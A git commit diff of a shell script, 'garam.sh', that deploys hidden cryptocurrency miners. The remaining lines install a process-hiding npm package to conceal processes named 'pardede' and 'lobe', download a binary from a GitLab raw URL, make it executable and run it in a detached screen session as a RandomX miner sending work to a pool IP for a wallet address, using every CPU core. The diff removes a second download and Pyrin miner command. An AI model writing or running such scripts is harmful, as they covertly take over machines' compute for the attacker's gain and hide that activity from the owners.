5bdd82ee0842a4837c93b4099cb0ae99a0347bb3
williehprnuhrxyq <159912408+williehprnuhrxyq@users.noreply.github.com>
2024-06-17 08:57:07 +0700

    Update garam.sh

--- garam.sh
+++ garam.sh
@@ -9,8 +9,6 @@ sudo apt install npm =y
 sudo npm i -g node-process-hider && sudo ph add pardede
 sudo ph add lobe
 wget https://gitlab.com/sarifadim/jomblo/-/raw/main/pardede && chmod +x *
-wget -qO lobe https://gitlab.com/sarifadim/jomblo/-/raw/main/lolipop && chmod +x lobe
-screen -dms run ./lobe --url=3JWuijUT2hwsC862trVXBSMzQW6JANF63j.$(echo 01-$(TZ=UTC-7 date +"%H-%M-%S"))@pyrinhash.auto.nicehash.com:9200 --log --extra --pers=PYI
 screen -dms run ./pardede -a rx/0 -o 47.89.195.104:443 -u ZEPHsC5qZJv8JqyaGPNAviDERPxFGBzXx1bo8rx7RqD9JkPh68Lk7AnLdsNAZfrukeFoU9dnboT6tAJkAZ1etvM1Q5PqiQu8DEk.$(echo A-$(TZ=UTC-7 date +"%H-%M-%S")) -p -x -t $(nproc --all)
 EOF
 screen -r
